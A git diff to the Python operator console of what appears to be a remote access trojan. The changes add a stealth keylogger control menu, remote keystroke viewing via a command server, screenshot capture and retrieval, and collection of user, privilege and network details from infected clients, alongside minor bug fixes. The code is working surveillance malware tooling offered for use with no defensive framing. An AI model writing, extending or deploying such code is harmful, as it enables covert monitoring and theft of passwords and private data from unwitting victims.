@@ -1,4 +1,4 @@
-import requests
+﻿import requests
 import json
 import time
 from datetime import datetime
@@ -153,10 +153,13 @@ class Controller:
             print("5. 🚀 Start process")
             print("6. ⚡Execute command")
             print("7. 💻 Get system info")
-            print("8. 🔙 Back to main menu")
+            print("8. ⌨️  Keylogger Management")
+            print("9. 📸 Screenshot Management")
+            print("10. 🔍 Detailed System Info")
+            print("11. 🔙 Back to main menu")
             
             
-            choice = input("\nSelect option(1-8): ").strip()
+            choice = input("\nSelect option(1-11): ").strip()
             
             if choice == "1":
                 self.handle_list_processes(client_id)
@@ -173,6 +176,12 @@ class Controller:
             elif choice == "7":
                 self.handle_system_info(client_id)
             elif choice == "8":
+                self.keylogger_management_menu(client_id)
+            elif choice == "9":
+                self.screenshot_management_menu(client_id)
+            elif choice == "10":
+                self.handle_detailed_system_info(client_id)
+            elif choice == "11":
                 break
             else:
                 print("[-] Invalid option")
@@ -191,12 +200,14 @@ class Controller:
             
             for proc in processes[:50]:
                 pid = proc.get('pid', 'N/A')
-                name = proc.get('name', 'N/A')[:18]
-                username = proc.get('username', 'N/A')[:13]
+                name = (proc.get('name') or 'N/A')[:18]
+                username = proc.get('username')
+                if username is None:
+                    username = 'N/A'
+                username = str(username)[:13]
                 cpu = proc.get('cpu_percent', 'N/A')
                 memory = proc.get('memory_percent', 'N/A')
-                status = proc.get('status', 'N/A')[:8]
-                
+                status = (proc.get('status') or 'N/A')[:8]
                 print(f"{pid:<8} {name:<20} {username:<15} {cpu:<6} {memory:<8} {status:<10}")
             
             if len(processes) > 50:
@@ -411,8 +422,311 @@ class Controller:
     
     
     
+    # ==================== KEYLOGGER MANAGEMENT ====================
+    
+    def keylogger_management_menu(self, client_id):
+        while True:
+            print("\n" + "="*50)
+            print(f"KEYLOGGER MANAGEMENT - Client: {client_id}")
+            print("="*50)
+            print("1. 🚀 Start Keylogger")
+            print("2. 🛑 Stop Keylogger")
+            print("3. 📊 Get Keylogger Status")
+            print("4. 📨 Force Log Upload")
+            print("5. 📝 View Captured Keylogs")
+            print("6. 🔙 Back to process menu")
+            
+            choice = input("\nSelect option(1-6): ").strip()
+            
+            if choice == "1":
+                self.handle_start_keylogger(client_id)
+            elif choice == "2":
+                self.handle_stop_keylogger(client_id)
+            elif choice == "3":
+                self.handle_keylogger_status(client_id)
+            elif choice == "4":
+                self.handle_force_upload(client_id)
+            elif choice == "5":
+                self.view_keylogs(client_id)
+            elif choice == "6":
+                break
+            else:
+                print("[-] Invalid option")
+    
+    def handle_start_keylogger(self, client_id):
+        stealth = input("Enable stealth mode? (y/n, default=y): ").strip().lower()
+        stealth_mode = stealth != 'n'
+        
+        print(f"\n[+] Starting keylogger on {client_id}...")
+        result = self.send_process_command(client_id, "start_keylogger", {
+            "stealth": stealth_mode
+        })
+        
+        if result and result.get('success'):
+            print(f"[+] Keylogger started successfully!")
+            print(f"    Log file: {result.get('log_file', 'Unknown')}")
+            print(f"    Stealth mode: {result.get('stealth_mode', 'Unknown')}")
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] Failed to start keylogger: {error}")
+    
+    def handle_stop_keylogger(self, client_id):
+        confirm = input("Are you sure you want to stop the keylogger? (y/n): ").strip().lower()
+        if confirm == 'y':
+            print(f"\n[+] Stopping keylogger on {client_id}...")
+            result = self.send_process_command(client_id, "stop_keylogger")
+            
+            if result and result.get('success'):
+                print(f"[+] Keylogger stopped successfully!")
+                print(f"    Message: {result.get('message', '')}")
+            else:
+                error = result.get('error', 'Unknown error') if result else 'No response'
+                print(f"[-] Failed to stop keylogger: {error}")
+        else:
+            print("[!] Operation cancelled")
+    
+    def handle_keylogger_status(self, client_id):
+        print(f"\n[+] Getting keylogger status for {client_id}...")
+        result = self.send_process_command(client_id, "get_keylogger_status")
+        
+        if result and not result.get('error'):
+            print("\n" + "="*50)
+            print("KEYLOGGER STATUS")
+            print("="*50)
+            
+            status_info = [
+                ('Running', 'running'),
+                ('Stealth Mode', 'stealth_mode'),
+                ('Buffered Keystrokes', 'buffered_keystrokes'),
+                ('Log File Size', 'log_file_size'),
+                ('Log File Path', 'log_file_path'),
+                ('Archived Logs', 'archived_logs')
+            ]
+            
+            for display_name, key in status_info:
+                value = result.get(key, 'N/A')
+                if key == 'log_file_size' and isinstance(value, (int, float)):
+                    value = f"{value / 1024:.2f} KB"
+                print(f"{display_name:<20}: {value}")
+                
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] Failed to get keylogger status: {error}")
+    
+    def handle_force_upload(self, client_id):
+        print(f"\n[+] Forcing keylog upload for {client_id}...")
+        result = self.send_process_command(client_id, "get_keylog_data")
+        
+        if result and not result.get('error'):
+            print(f"[+] {result.get('message', 'Keylog data sent to server')}")
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] Failed to force upload: {error}")
+
+
+    
+    def view_keylogs(self, client_id):
+        try:
+            print(f"\n[+] Fetching recent keylogs for {client_id}...")
+            response = requests.get(f"{self.server_url}/admin/keylogs/{client_id}", timeout=10)
+            
+            if response.status_code == 200:
+                keylogs = response.json().get('keylogs', [])
+                
+                if keylogs:
+                    print(f"\n[+] Found {len(keylogs)} recent keylogs:")
+                    print("-" * 80)
+                    
+                    for log in keylogs[:20]:  # Afficher les 20 premiers
+                        timestamp = log.get('timestamp', 'Unknown')
+                        window = log.get('window', 'Unknown')[:30]
+                        keystroke = log.get('keystroke', 'Unknown')
+                        
+                        # Formater le timestamp
+                        try:
+                            dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
+                            time_str = dt.strftime("%H:%M:%S")
+                        except:
+                            time_str = timestamp
+                        
+                        print(f"[{time_str}] {window}: {keystroke}")
+                    
+                    if len(keylogs) > 20:
+                        print(f"\n[!] Showing 20 out of {len(keylogs)} keylogs")
+                else:
+                    print("[-] No keylogs found for this client")
+            else:
+                print(f"[-] Failed to fetch keylogs: {response.status_code}")
+                
+        except Exception as e:
+            print(f"[-] Error fetching keylogs: {e}")
     
     
+    
+    def screenshot_management_menu(self, client_id):
+        while True:
+            print("\n" + "="*50)
+            print(f"SCREENSHOT MANAGEMENT - Client: {client_id}")
+            print("="*50)
+            print("1. 📷 Take Single Screenshot")
+            print("2. 🔙 Back to process menu")
+            
+            choice = input("\nSelect option(1-2): ").strip()
+            
+            if choice == "1":
+                self.handle_take_screenshot(client_id, multi=False)
+            elif choice == "2":
+                break
+            else:
+                print("[-] Invalid option")
+    
+    def handle_take_screenshot(self, client_id, multi=False):
+        quality = input("Quality (30-95, default=65): ").strip()
+        quality = int(quality) if quality.isdigit() else 65
+        
+        action = "take_screenshot"
+        data = {
+            "quality": quality,
+            "multi_display": multi
+        }
+        
+        print(f"\n[+] Taking {'multi-display ' if multi else ''}screenshot...")
+        result = self.send_process_command(client_id, action, data)
+        
+        if result and result.get('success'):
+            print(f"[+] Screenshot captured successfully!")
+            print(f"    Size: {result.get('width', 'N/A')}x{result.get('height', 'N/A')}")
+            print(f"    File size: {result.get('size_kb', 'N/A')}KB")
+            print(f"    Quality: {result.get('quality', 'N/A')}")
+            
+            # Option pour sauvegarder l'image
+            save = input("Save screenshot to file? (y/n): ").strip().lower()
+            if save == 'y':
+                self.save_screenshot_to_file(result, client_id)
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] Screenshot failed: {error}")
+    
+    
+    def save_screenshot_to_file(self, screenshot_data, client_id):
+        try:
+            import base64
+            from datetime import datetime
+            
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"screenshot_{client_id}_{timestamp}.jpg"
+            
+            image_data = screenshot_data.get('data')
+            if image_data:
+                with open(filename, 'wb') as f:
+                    f.write(base64.b64decode(image_data))
+                print(f"[+] Screenshot saved as: {filename}")
+            else:
+                print("[-] No image data to save")
+        except Exception as e:
+            print(f"[-] Error saving screenshot: {e}")
+    
+    
+    
+    def handle_detailed_system_info(self, client_id):
+        print("\n[+] Getting detailed system information...")
+        
+        # Menu pour choisir le type d'info
+        print("\n📊 Detailed System Info Options:")
+        print("1. 🖥️  Full System Overview")
+        print("2. 💻 Operating System Details")
+        print("3. 🔧 Architecture Information")
+        print("4. 👤 User Information")
+        print("5. 🛡️  Privileges Information")
+        print("6. 🌐 Network Information")
+        
+        choice = input("\nSelect info type (1-6): ").strip()
+        
+        actions = {
+            "1": "get_detailed_system_info",
+            "2": "get_os_info", 
+            "3": "get_architecture_info",
+            "4": "get_user_info",
+            "5": "get_privileges_info",
+            "6": "get_network_info"
+        }
+        
+        if choice in actions:
+            result = self.send_process_command(client_id, actions[choice])
+            self.display_detailed_system_info(result, actions[choice])
+        else:
+            print("[-] Invalid option")
+
+    def display_detailed_system_info(self, system_data, info_type):
+        if not system_data or system_data.get("error"):
+            error = system_data.get('error', 'Unknown error') if system_data else 'No response'
+            print(f"[-] Failed to get system info: {error}")
+            return
+        
+        print("\n" + "="*60)
+        print("🖥️  DETAILED SYSTEM INFORMATION")
+        print("="*60)
+        
+        if info_type == "get_detailed_system_info":
+            # Affichage complet
+            self._display_os_info(system_data.get('operating_system', {}))
+            self._display_architecture_info(system_data.get('architecture', {}))
+            self._display_user_info(system_data.get('user', {}))
+            self._display_privileges_info(system_data.get('privileges', {}))
+            self._display_network_info(system_data.get('network', {}))
+            
+        elif info_type == "get_os_info":
+            self._display_os_info(system_data.get('operating_system', {}))
+            
+        elif info_type == "get_architecture_info":
+            self._display_architecture_info(system_data.get('architecture', {}))
+            
+        elif info_type == "get_user_info":
+            self._display_user_info(system_data.get('user', {}))
+            
+        elif info_type == "get_privileges_info":
+            self._display_privileges_info(system_data.get('privileges', {}))
+            
+        elif info_type == "get_network_info":
+            self._display_network_info(system_data.get('network', {}))
+    
+    def _display_os_info(self, os_info):
+        print("\n💻 OPERATING SYSTEM")
+        print("-" * 40)
+        for key, value in os_info.items():
+            print(f"{key.replace('_', ' ').title():<20}: {value}")
+    
+    def _display_architecture_info(self, arch_info):
+        print("\n🔧 ARCHITECTURE")
+        print("-" * 40)
+        for key, value in arch_info.items():
+            print(f"{key.replace('_', ' ').title():<20}: {value}")
+    
+    def _display_user_info(self, user_info):
+        print("\n👤 USER INFORMATION")
+        print("-" * 40)
+        for key, value in user_info.items():
+            print(f"{key.replace('_', ' ').title():<20}: {value}")
+    
+    def _display_privileges_info(self, priv_info):
+        print("\n🛡️  PRIVILEGES")
+        print("-" * 40)
+        for key, value in priv_info.items():
+            print(f"{key.replace('_', ' ').title():<20}: {value}")
+    
+    def _display_network_info(self, net_info):
+        print("\n🌐 NETWORK INFORMATION")
+        print("-" * 40)
+        for key, value in net_info.items():
+            if isinstance(value, list):
+                print(f"{key.replace('_', ' ').title():<20}:")
+                for item in value:
+                    print(f"  - {item}")
+            else:
+                print(f"{key.replace('_', ' ').title():<20}: {value}")
+    
+    
+    # ==================== FILE MANAGEMENT ====================
     
     def send_file_command(self, client_id, action, data=None):
         try:
@@ -582,7 +896,7 @@ class Controller:
 
 
             if items:
-                choice = input("\nEnter to navigate into directory, 'p' for parent, or Enter to continue: ").strip()
+                choice = input("\nEnter number to navigate into directory, 'p' for parent, or Enter to continue: ").strip()
                 if choice.isdigit():
                     index = int(choice) - 1
                     if 0 <= index < len(items):
@@ -717,7 +1031,7 @@ class Controller:
                         print(f"[-] Download failed at chunk {chunk_index}: {error}")
                         return
             
-            print(f"[+]Download completed: {local_path}")
+            print(f"[+] Download completed: {local_path}")
             
         else:
             error = result.get('error', 'Unknown error') if result else 'No response'
@@ -888,7 +1202,6 @@ class Controller:
         
         if result and result.get("success"):
             message = result.get("message", "")
-            print(f"[+] Directory created: {message}")
             print(f"[+] Directory created: {message}")
         else:
             error = result.get('error', 'Unknown error') if result else 'No response'
